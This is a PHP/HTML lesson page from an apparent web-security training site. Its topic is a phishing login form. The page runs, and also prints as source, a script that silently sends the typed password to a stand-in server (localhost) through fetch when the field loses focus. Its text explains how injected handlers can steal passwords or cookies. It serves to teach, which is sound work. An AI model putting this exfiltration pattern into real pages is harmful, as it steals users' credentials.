<?php
//load and connect the database
require_once '../php/db.php';
//If there are no the value of $_SESSION['is_login']or $_SESSION['is_login'] equals false ,
//means user identity not verifed
if(!isset($_SESSION['is_login']) || !$_SESSION['is_login'])
{
	header("Location: ../login.php");
}
?>
<!DOCTYPE <html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>WHD:Learning</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <!-- For mobile devices or flat panel display, depending on the width
    of the device, the initial magnification ratio 1 -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- load bootstrap css -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css"/>
    <script src='../js/jquery-3.3.1.min.js'></script>
    <!-- ajax-->
    <script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
    <!-- Compiled and minified CSS-->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0-rc.2/css/materialize.min.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <!-- Compiled and minified JavaScript-->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0-rc.2/js/materialize.min.js"></script>

    <script src='../js/learn.js'></script>
    <link rel="shortcut icon" href="../images/favicon.ico">
  </head>

  <body>
    <!-- nav Top -->
    <?php include_once 'navTop.php'; ?>


    <!--nav Botton-->
      <nav class="navbar navbar-default navbar-fixed-bottom">
        <div class="container-fluid">
          <a class="waves-effect waves-light btn tooltipped" id="backButton" href="learn07.php" data-position="top" data-tooltip="Go back to Lesson7">
            <i class="material-icons left">arrow_back</i>Back</a>
          <a class="tooltipped waves-effect waves-light btn tooltipped" id="nextButton" href="learn09.php" data-position="top"
            data-tooltip="Before going to next lesson, don't forget to turn on the switch.">
            <i class="material-icons right">arrow_forward</i>Next</a>
        </div>
        <style>
        nav, nav .nav-wrapper i, nav a.sidenav-trigger, nav a.sidenav-trigger i {
            height: 5%;
        }
        #backButton{
          margin-left: 25%;
          vertical-align: top;

        }
        #nextButton{
          margin-left: 30%;
          vertical-align: top;
        }

        nav i, nav [class^="mdi-"], nav [class*="mdi-"], nav i.material-icons{
          line-height: 36px;
        }
        #iconLeft{
          line-height: 20px
        }
        </style>
			</nav>
<!-- nav Side -->
<?php include_once 'navSide.php'; ?>

      <!--Content-->
        <div class="col-md-4">
          <a id="list"href="#" data-target="slide-out" class="sidenav-trigger"><i class="material-icons">format_list_numbered</i>
          Lesson 8: Malicious phishing website</a>
            <style>
            a#list{
              vertical-align: top;
              color: green;
            }
              #textarea{
                max-height:50%;
                overflow: scroll;
              }
            </style>
          <ul class="collapsible">
    <li id="learn"class="active">
      <div class="collapsible-header"><i class="material-icons">import_contacts</i>Learn</div>
      <div class="collapsible-body" id="textarea">
        <span>
          Reverse thinking<br>
The previous examples are all made by malicious people into the executable malicious code, which is called XSS attack.
<br><br>
As for how to steal information? Just insert the code and send it to the attacker's server in AJAX mode.
<br><br>
This example is a phishing website that receives the user's password and sends it to a specific server for the malicious developer to obtain.
<br><br>
When the user thinks that the password is safe, it is not known that when the user clicks the Submit button, the onfocusout event is triggered, so that the password is silently sent to the malicious server (here, the localhost does not exist).
<br><br>
This demonstration is that I have already written it on the webpage. If a malicious person finds a vulnerability that can be inserted into the code, then he can use "document.getElementById('id').onfocusout = function() {...} " A method such as dynamically inserting an event or stealing important data hidden in a cookie. Not only that, the user trusts your site very much, so you can hardly notice it when you execute arbitrary commands, so you can use it for even worse purposes.
  </span>
      </div>
    </li>
    <li id="ins">
      <div class="collapsible-header"><i class="material-icons">dvr</i>Instructions</div>
      <div class="collapsible-body" id="textarea">
        <span>
          <ol>
            <li>Open the Chrome Developer Tools, there are three ways to open it:
              <ol type='a'>
                <li>Select More Tools > Developer Tools in the Chrome menu</li>
                <li>Right click on the page element and select "Check"</li>
                <li>Use the shortcut Ctrl+Shift+I (Windows) or Cmd+Opt+I (Mac)</li>
              </ol>
            </li>
            <li>Observe the network monitor and observe its content changes.</li>
            <li>Feel free to enter username and password and press login button.</li>
            <li>You will be able to receive the password you just entered on the server.</li>
          </ol>
        </span>
      </div>
    </li>

    <li id="codeComp">
      <div class="collapsible-header"><i class="material-icons">code</i>Code Comparison</div>
      <div class="collapsible-body" id="textarea">
        <span>
There is no code Comparison for Lession8.
        </span>
      </div>
    </li>
  </ul>
</div>

<!--example----------------------------------------------------------------------->
<script>
  var send_password = function(){
    var pwd = document.getElementById('password').value;
    fetch('http://localhost/?pwd=' + pwd,{
      method:'GET'
    }).then(()=>{});
  }
</script>

        <div class="col-md-4" >
          <h3>Malicious phishing</h3>
          <div class="chip">Insecure Development</div>
          <h4> Login </h4>
            <div class="form-group">
              <label for="username">User Name: </label>
              <input  id="username"type="text" placeholder="please input your username">
            </div>
            <div class="form-group">
              <label for="password">Password: </label>
              <input type="password" id="password" type="password" onfocusout="send_password();"  placeholder="please input your password">
            </div>
            <button type="submit" class="btn btn-default">
              Login
            </button>
  <!-- Switch -->
  <div class="switch right" >
    <label>
      Off
      <input type="checkbox" id="switch" onchange="gcheck('switch')" <?php echo ($_SESSION['user_L8'] == 1)?'checked':'';?>>
      <span class="lever"></span>
      On
    </label>
  </div>
  <script>
  //switch controller
  function gcheck(a){
  var a;
  var $aa = $("#"+a);
  if($aa.is(":checked"))
  {
  //change th learning status
  $.ajax({
    type : "POST",
    url : "../php/status_change.php",
    data : {
    lesson : "L8", //lesson
    ls : "1" //1 represents completed
  },
  dataType : 'html' //設定該網頁回應的會是 html 格式
  }).done(function(data) {
    //When Successful
    console.log(data);
    if(data == "1")
    {
    console.log("1changed");
    }
    else
    {
    console.log("0still");
    }
  }).fail(function(jqXHR, textStatus, errorThrown) {
  //fail
  alert("Error occur，please check the console log");
    console.log(jqXHR.responseText);
  });
  }
else
{

    $.ajax({
    type : "POST",
    url : "../php/status_change.php",
    data : {
    lesson : "L8",
    ls : "0" //0 means not completed yet
    },
    dataType : 'html'
  }).done(function(data) {
    console.log(data);
    if(data == "0")
    {
    console.log("0changed");
    }
    else
    {
    console.log("1still");
    }
  }).fail(function(jqXHR, textStatus, errorThrown) {
  alert("Error occur，please check the console log");
    console.log(jqXHR.responseText);
  });
}
}
  </script>

</div>


<!--Code------------------------------------------------------------>

<!--Code Insecure-->
        <div class="col-md-4">
          <ul class="nav nav-tabs nav-justified">
            <li role="presentation" class="active"><a>phishing.php</a>
            </li>

            <li role="presentation" ><a>Insecure</a></li>
          </ul>
          <style>
          #sourceCode{
            height:70%;
            overflow: scroll;
          }
          </style>

            <pre id="sourceCode">
              <a id="zoomIn"class="waves-effect waves-light btn modal-trigger btn-floating right"
              style="position:fixed; right:30px;" href="#modal1">
                <i class="material-icons">zoom_in</i>
              </a>
&lt;script>
var send_password = function(){
  var pwd = document.getElementById('password').value;
  fetch('http://localhost/?pwd=' + pwd,{
    method:'GET'
  }).then(()=>{});
}
&lt;/script>
            </pre>
          </div>

<!-- Modal Structure -->
<!--Insecure-->
        <div id="modal1" class="modal">
          <div class="modal-content">
            <h4>phishing.php</h4>
            <pre>
&lt;script>
var send_password = function(){
  var pwd = document.getElementById('password').value;
  fetch('http://localhost/?pwd=' + pwd,{
    method:'GET'
  }).then(()=>{});
}
&lt;/script>
            </pre>

          </div>
          <div class="modal-footer">
            <a href="javascript:void(0);" class="modal-close waves-effect waves-green btn-flat">Close</a>
          </div>
        </div>
  </body>
</html>
